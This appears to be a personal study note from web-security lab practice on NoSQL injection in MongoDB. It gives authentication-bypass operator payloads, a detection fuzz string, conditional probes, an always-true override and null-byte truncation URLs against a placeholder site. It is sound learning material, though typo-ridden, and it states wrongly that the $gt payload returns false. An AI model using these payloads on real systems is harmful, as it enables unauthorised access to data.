SQL injection si when you able to execute database commands from a backend server.
![[Pasted image 20241027171915.png]]
This avaible you to:
- Bypass authentication or protection mechanisms.
- Extract or edit data.
- Cause a denial of service.
- Execute code on the server.
For more information check [[Injection]] in APIS
There are two different types of NO-SQLI:
##### Syntax Injection
The attacker aimed to break the syntax of the Mongo query, imagine you got the following request with this syntax:
```js
db.users.find({ "username": "user1", "password": "pass" })
```
So you could craft a payload which always will return true:
```js
db.users.find({ "username": "user1", "password": { "$ne": null } })
```
##### Operator injection 
This occurs when you can use NoSQL query operators to manipulate queries, for example:
```js
db.users.find({ "username": "user1", "password": "pass123" })
```
And then inject:
```js
db.users.find({ "username": "user1", "password": { "$gt": "" } })
```
As the pasword will be always greater than an empty string whis will return false

------
### DEtecting they're vulnerable 
So to detect this we need to cause an error on the datas base with the provided strings:
```
'"`
{ ;$Foo} 
$Foo \xYZ
```
So imagine you got a URL with the following query:
```url
https://insecure-website.com/product/lookup?category=fizzy
````
use the following url:
```url
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```
If this causes a change from the original response, this may indicate that user input isn't filtered or sanitized correctly.
###### Determining which character is proseced
To know what character is causing the issue we can check one by one, as submit `'`, so the mongo db query would be like this:
```
this.category == '''
```
And if this response differ from the original that may indicate that you broke the query syntax, you could confirm this by sending a correct syntax:
```
this.category == '\''
```
###### Confirming conditional behavior
So to confirm this we shpuld to send 2 conditions, one true, `' && 0 && 'x`, and other false, `' && 1 && 'x`:
```url
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
```
and the true one:
```url
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
```
###### Overriding existing conditions
Once you identified this you can attempt to override existing conditions to exploit the vulnerability, for this you can use a JS condition that alwas will be true `'||'1'=='1`
```url
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31
```
and this result in the following mongodb query:
```js
this.category == 'fizzy'||'1'=='1'
```
Following this we'll solved the lab: [[Detecting_NoSQLI]]

### Null byte
There's a conflicting character which cause to ignore all the character after it. So this means that any additional conditions on the MongoDB query are ignored.

You could also add a null character after the category value. MongoDB may ignore all characters after a null character. This means that any additional conditions on the MongoDB query are ignored. For example, the query may have an additional `this.released` restriction:

`this.category == 'fizzy' && this.released == 1`

The restriction `this.released == 1` is used to only show products that are released. For unreleased products, presumably `this.released == 0`.

In this case, an attacker could construct an attack as follows:

`https://insecure-website.com/product/lookup?category=fizzy'%00`

This results in the following NoSQL query:

`this.category == 'fizzy'\u0000' && this.released == 1`

If MongoDB ignores all characters after the null character, this removes the requirement for the released field to be set to 1. As a result, all products in the `fizzy` category are displayed, including unreleased products.